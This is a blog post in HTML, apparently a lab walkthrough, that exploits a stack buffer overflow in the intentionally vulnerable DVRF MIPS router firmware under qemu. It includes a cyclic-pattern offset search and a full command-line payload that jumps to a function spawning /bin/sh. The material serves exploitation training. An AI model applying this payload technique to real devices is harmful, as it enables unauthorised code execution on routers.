@@ -1,0 +1,363 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Stackoverflow in MIPS | k0x55aa</title>
+  <meta name="author" content="k0x55aa">
+  
+  <meta name="description" content="Stack Buffer Overflow in MIPSELToday we are going learn  a simple stack buffer overflow for mips architecture(little endian). We are going to use the DVRF firmware by praetorian.
+Requirements:
+
+Firmware
+Binwalk
+Qemu-user-static
+Gdb-multiarch with pwndbg
+Ghidra
+
+SetupDownload the firmware
+12345678┌──(kali㉿kali)-[~]└─$ mkdir Firmware┌──(kali㉿kali)-[~]└─$ cd Firmware/┌──(kali㉿kali)-[~/Firmware]└─$ wget https://raw.githubusercontent.com/praetorian-inc/DVRF/refs/heads/master/Firmware/DVRF_v03.bini
+
+Install the Binwalk by referring the link then copy the binary to a /usr/local/bin/binwalk
+12┌──(kali㉿kali)-[~/binwalk]└─$ sudo cp target/release/binwalk /usr/local/bin/binwalk
+
+Install the qemu static by using the following command"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Stackoverflow in MIPS"/>
+  <meta property="og:site_name" content="k0x55aa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="k0x55aa" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">k0x55aa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Stackoverflow in MIPS</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Stack-Buffer-Overflow-in-MIPSEL"><a href="#Stack-Buffer-Overflow-in-MIPSEL" class="headerlink" title="Stack Buffer Overflow in MIPSEL"></a>Stack Buffer Overflow in MIPSEL</h1><p>Today we are going learn  a simple stack buffer overflow for mips architecture(little endian). We are going to use the <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/praetorian-inc/DVRF/refs/heads/master/Firmware/DVRF_v03.bin">DVRF</a> firmware by praetorian.</p>
+<p>Requirements:</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/praetorian-inc/DVRF/refs/heads/master/Firmware/DVRF_v03.bin">Firmware</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk">Binwalk</a></li>
+<li>Qemu-user-static</li>
+<li>Gdb-multiarch with pwndbg</li>
+<li><a target="_blank" rel="noopener" href="https://ghidra-sre.org/">Ghidra</a></li>
+</ol>
+<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><p>Download the firmware</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">mkdir</span> Firmware</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cd</span> Firmware/</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Firmware]</span><br><span class="line">└─$ wget https://raw.githubusercontent.com/praetorian-inc/DVRF/refs/heads/master/Firmware/DVRF_v03.bini</span><br></pre></td></tr></table></figure>
+
+<p>Install the Binwalk by referring the <a target="_blank" rel="noopener" href="https://github.com/ReFirmLabs/binwalk/wiki/Compile-From-Source">link</a> then copy the binary to a <code>/usr/local/bin/binwalk</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/binwalk]</span><br><span class="line">└─$ sudo <span class="built_in">cp</span> target/release/binwalk /usr/local/bin/binwalk</span><br></pre></td></tr></table></figure>
+
+<p>Install the qemu static by using the following command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo apt install qemu-user-static  </span><br></pre></td></tr></table></figure>
+
+<p>Install the gdb-multiarch and pwndbg by using following command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ sudo apt install gdb-multiarch </span><br><span class="line">....</span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg </span><br><span class="line">....</span><br><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ <span class="built_in">cd</span> pwndbg </span><br><span class="line">....</span><br><span class="line">┌──(kali㉿kali)-[~/pwndbg]</span><br><span class="line">└─$ ./setup.sh</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
+
+<p>Install  of ghidra in kali can be done by using</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/pwndbg]</span><br><span class="line">└─$ sudo apt-get install ghidra</span><br></pre></td></tr></table></figure>
+
+<h2 id="Binary-Extraction"><a href="#Binary-Extraction" class="headerlink" title="Binary Extraction"></a>Binary Extraction</h2><p>Lets view our firmware’s different section with binwalk</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image.png" alt="alt text"></p>
+<p>Now let’s extract recursively using -eM flag using Binwalk</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%201.png" alt="alt text"></p>
+<p>We can see there are recursive different section embedded into the firmware  and we can see our file system <code>SquashFS</code> .  change the director to the file system as shown below.</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%202.png" alt="alt text"></p>
+<p>The stack overflow can be found as shown below</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%203.png" alt="alt text"></p>
+<h2 id="Binary-Emulation"><a href="#Binary-Emulation" class="headerlink" title="Binary Emulation"></a>Binary Emulation</h2><p>Let’s the run  <code>stack_bof_01</code> using <code>chroot</code> and <code>qemu-mipsel-static</code> . Copy the <code>qemu-mipsel-static</code> to the file system directory</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/…/20/partition_1.bin.extracted/0/squashfs-root]</span><br><span class="line">└─$ <span class="built_in">cp</span> $(<span class="built_in">which</span> qemu-mipsel-static) .</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(kali㉿kali)-[~/…/20/partition_1.bin.extracted/0/squashfs-root]</span><br><span class="line">└─$ <span class="built_in">ls</span>              </span><br><span class="line">bin  dev  etc  lib  media  mnt  proc  pwnable  qemu-mipsel-static  sbin  sys  tmp  usr  var  www</span><br></pre></td></tr></table></figure>
+
+<p>In order to run we will chroot to the file system directory and run the binary using the qemu static</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%204.png" alt="alt text"></p>
+<h2 id="Debugging-with-Qemu-and-GDB-PWNDBG"><a href="#Debugging-with-Qemu-and-GDB-PWNDBG" class="headerlink" title="Debugging with Qemu and GDB (PWNDBG)"></a>Debugging with Qemu and GDB (PWNDBG)</h2><p>We can turn on the gdb server with qemu using the <code>-g</code> flag  and the port to which our gdb client should connect for remote debugging</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%205.png" alt="alt text"></p>
+<p>Open a new terminal and connect the gdb-multiarch client to server</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ gdb-multiarch</span><br><span class="line">GNU gdb (Debian 15.1-1) 15.1</span><br><span class="line">--</span><br><span class="line">GDB<span class="string">&#x27;s set directories &lt;path&gt; parameter can be used to debug e.g. glibc sources like the malloc/free functions!</span></span><br><span class="line"><span class="string">pwndbg&gt; target remote 127.0.0.1:1234</span></span><br><span class="line"><span class="string">.......</span></span><br></pre></td></tr></table></figure>
+
+<p>Below shows the input and the output while debugging which halts the program</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%206.png" alt="alt text"></p>
+<p>In <code>pwndbg</code> hit <code>c</code> to continue the program execution till it exits as shown below</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%207.png" alt="alt text"></p>
+<p>And on the qemu terminal we can see that our program exits</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%208.png" alt="alt text"></p>
+<h2 id="Finding-the-Overflow"><a href="#Finding-the-Overflow" class="headerlink" title="Finding the Overflow"></a>Finding the Overflow</h2><p>Now lets try to find the overflow by giving long random input. Let’s generate the random input by using <code>cyclic</code> in <code>pwndbg</code> .</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; cyclic 250</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacma </span><br></pre></td></tr></table></figure>
+
+<p>The above command with  generate 250 characters random input, copy the input and use as the argument to the binary input.</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%209.png" alt="alt text"></p>
+<p>Connect to gdbserver using <code>target remote 127.0.0.1:1234</code> command in pwndbg and hit continue <code>c</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote 127.0.0.1:1234</span><br><span class="line">..</span><br><span class="line">[redacted]</span><br><span class="line">pwndbg&gt; c</span><br></pre></td></tr></table></figure>
+
+<p>We can see that our program counter <code>PC</code> register is overflow with <code>baac</code> . The <code>PC</code> is same as <code>EIP</code> or <code>RIP</code> for x86 and x64 intel architecture.</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%2010.png" alt="alt text"></p>
+<p>Copy the <code>baac</code> pattern to find the offset using cyclic</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%2011.png" alt="alt text"></p>
+<p>We can see that our offset where the overflow or the Program Counters <code>PC</code> get overflowed is <code>204</code> . In order to take the advantage of this overflow, we have to control the <code>PC</code> by overwriting the buffer with the address that we want our program to moves on.</p>
+<h2 id="Jumping-Functions"><a href="#Jumping-Functions" class="headerlink" title="Jumping Functions"></a>Jumping Functions</h2><p>Let’s open the binary in ghidra to see any interesting functions present in the binary. We can see in the <code>Symbol Tree -&gt; Functions</code> all the functions listed where we found an interesting function <code>dat_shell</code> which executes <code>system</code> commands and executes <code>/bin/sh</code></p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%2012.png" alt="alt text"></p>
+<p>Lets try to jump the function address <code>0040095c</code> instead of <code>00400950</code> because jumping to <code>00400950</code> doesn’t execute the function</p>
+<p>Lets craft the payload by printing 204 A’s then adding <code>0040095c</code></p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%2013.png" alt="alt text"></p>
+<p>since we know that our binary is little ending the final payload to be crafted is</p>
+<p><code>204*’A&#39;+&#39;\x5c\x09\x40\x00&#39;</code>. Since our input is an argument we have to use echo with -e for crafting the non printable character as input</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/…/20/partition_1.bin.extracted/0/squashfs-root]</span><br><span class="line">└─$ sudo <span class="built_in">chroot</span> . ./qemu-mipsel-static  ./pwnable/Intro/stack_bof_01 <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`echo -e &quot;</span>\\x5c\\x09\\x40\\x00<span class="string">&quot;`&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The <code>dat_shell</code> is executed and we get our <code>/bin/sh</code> running as show below.</p>
+<p><img src="/2024/10/31/bufferoverflowmips/image%2014.png" alt="alt text"></p>
+
+	  <div class="article-footer-copyright">
+
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank"></a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/10/14/decryptingfirmware/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-10-31 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/router/">router<span>1</span></a></li> <li><a href="/tags/stackoverflow/">stackoverflow<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 k0x55aa's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"https://raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/girls-frontline/M4-SOPMOD-II-2/normal/model.json"},"display":{"position":"right","superSample":2,"width":200,"height":450,"hOffset":30,"vOffset":-20},"mobile":{"position":"bottom","width":100,"height":100,"show":true,"scale":0.5,"hOffset":1,"vOffset":-1},"react":{"opacityDefault":1,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+   </html>
